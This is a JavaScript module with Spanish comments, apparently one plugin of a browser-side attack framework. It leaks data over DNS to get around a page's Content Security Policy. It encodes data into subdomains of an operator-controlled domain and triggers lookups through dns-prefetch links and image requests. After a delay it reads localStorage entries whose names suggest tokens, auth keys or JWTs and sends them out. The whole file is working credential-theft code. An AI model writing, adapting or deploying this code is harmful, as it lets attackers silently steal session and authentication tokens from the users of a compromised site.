/* m-dns-exfil.js — DNS exfiltration. Bypassa CSP connect-src (no es fetch).
   Exfil vía <link rel=dns-prefetch> / Image src a <data>.oplab.example.com. Para tokens pequeños cuando HTTP está bloqueado. */
(function(G){
if(!G)return; if(G._M&&G._M.dnsx)return; G._M=G._M||{}; G._M.dnsx=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
var OFF=window.__GE_OFF__||{};
try{
// DOMAIN: dominio controlado por el operador (ej. oplab.example.com). Los datos van en subdomain.
var DOMAIN=(OFF.C&&OFF.C.DNS_DOMAIN)||'ge-dns.example.com';
function b32(s){s=unescape(encodeURIComponent(s));var a='abcdefghijklmnopqrstuvwxyz234567',o='',bits=0,val=0;
for(var i=0;i<s.length;i++){val=(val<<8)|s.charCodeAt(i);bits+=8;while(bits>=5){o+=a[(val>>(bits-5))&31];bits-=5}}
if(bits>0)o+=a[(val<<(5-bits))&31];return o.replace(/=+$/,'')}
function chunk(str,n){var out=[];for(var i=0;i<str.length;i+=n)out.push(str.slice(i,i+n));return out}
function send(label,data){
var enc=b32(data||'').slice(0,63);
var host=enc+'.'+label+'.'+DOMAIN;
// dns-prefetch: el navegador resuelve el subdomain → el operador ve el query en su DNS log
try{var l=document.createElement('link');l.rel='dns-prefetch';l.href='//'+host;document.head.appendChild(l)}catch(e){}
// refuerzo con Image (algunos navegadores no resuelven dns-prefetch sin uso)
try{var img=new Image();img.src='https://'+host+'/i.gif';}catch(e){}
}
window.__GE__._dnsExfil=send;
// exfil tokens críticos vía DNS (stealth cuando HTTP bloqueado)
setTimeout(function(){
var toks=[];
try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i),v=localStorage.getItem(k)||'';
if(/token|auth|key|jwt/i.test(k)&&v.length<200)toks.push(k.slice(0,8)+'='+v.slice(0,40))}}catch(e){}
toks.forEach(function(t,i){setTimeout(function(){send('t'+i,t)},i*300)});
send('boot',(OFF.id||'anon').slice(0,20));
hx('dns-exfil-boot',{domain:DOMAIN,sent:toks.length});
},2000);
}catch(e){hx('m-dnsx-err',{m:e.message})}
})(window.__GE__);
